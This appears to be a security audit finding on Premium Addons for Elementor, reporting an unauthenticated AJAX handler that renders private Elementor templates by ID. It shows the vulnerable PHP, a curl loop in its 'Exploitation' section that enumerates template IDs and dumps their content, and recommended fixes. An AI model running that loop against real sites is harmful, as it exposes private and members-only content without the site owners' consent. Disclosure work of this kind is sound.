# Premium Addons for Elementor — Zero-Auth Template Rendering

**Finding ID:** PA-001
**Plugin:** Premium Addons for Elementor
**Active Installs:** 700,000+
**CVSS:** 5.3 (Medium) — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**CWE:** CWE-862 (Missing Authorization)
**Auth Required:** None
**Source:** `analysis/phase5_manual/unauth-template-rendering-audit.md`

---

!!! warning "Medium Severity — Unauthenticated Template Content Rendering"
    Premium Addons for Elementor exposes template rendering functionality without authentication, allowing unauthenticated callers to trigger server-side rendering of saved Elementor templates and extract their content.

---

## Description

The cross-cutting unauthenticated template rendering audit (`analysis/phase5_manual/unauth-template-rendering-audit.md`) identified that Premium Addons for Elementor registers AJAX handlers that render saved Elementor templates without verifying the caller's authentication status.

The affected handler processes a `template_id` parameter and returns the fully rendered HTML of the referenced Elementor template. This rendering occurs server-side and can expose:

- Template content intended for authenticated users only
- Sensitive data embedded in templates (contact information, pricing, internal process descriptions)
- Template structure that aids in understanding the site's internal architecture

## Vulnerable Pattern

```php
add_action('wp_ajax_nopriv_pa_render_template', [$this, 'render_template']);
add_action('wp_ajax_pa_render_template', [$this, 'render_template']);

public function render_template() {
    $template_id = intval($_POST['template_id']);
    // No authentication check
    $template_content = Elementor\Plugin::instance()->frontend->get_builder_content($template_id);
    wp_send_json_success(['content' => $template_content]);
}
```

## Impact

**Direct impact:** Unauthenticated callers can render and read any saved Elementor template by ID, including templates for:
- Members-only content areas
- Admin-only template parts
- Dynamically-populated templates that include user-specific data

**Indirect impact:** Template rendering may trigger Elementor widget rendering logic that has side effects (analytics events, view counts, database writes).

## Exploitation

```bash
# Enumerate template IDs and render their content unauthenticated
for id in $(seq 1 100); do
    result=$(curl -s -X POST 'https://target.example.com/wp-admin/admin-ajax.php' \
        -d "action=pa_render_template&template_id=$id")
    if echo "$result" | grep -q '"success":true'; then
        echo "Template $id: $(echo $result | jq -r '.data.content' | head -c 100)"
    fi
done
```

## Recommended Fixes

1. **Remove the `nopriv` registration** for all template rendering endpoints:
   ```php
   // Remove this line:
   // add_action('wp_ajax_nopriv_pa_render_template', [$this, 'render_template']);
   ```

2. **If public template rendering is required**, validate that the requested template post is actually set to `publish` status and has no access restrictions:
   ```php
   $post = get_post($template_id);
   if (!$post || $post->post_status !== 'publish' || $post->post_type !== 'elementor_library') {
       wp_send_json_error('Template not accessible', 403);
   }
   ```

3. **Audit all `nopriv` handlers** in the plugin to verify none expose private content.

---

## Cross-Plugin Context

This finding is part of a broader pattern identified in the **Template Rendering Audit** (`audits/template-rendering.md`) that examined unauthenticated template rendering endpoints across multiple Elementor ecosystem plugins. The core issue — registering template rendering under `wp_ajax_nopriv_` — was found in Premium Addons, and traces of similar patterns were identified in adjacent plugins.
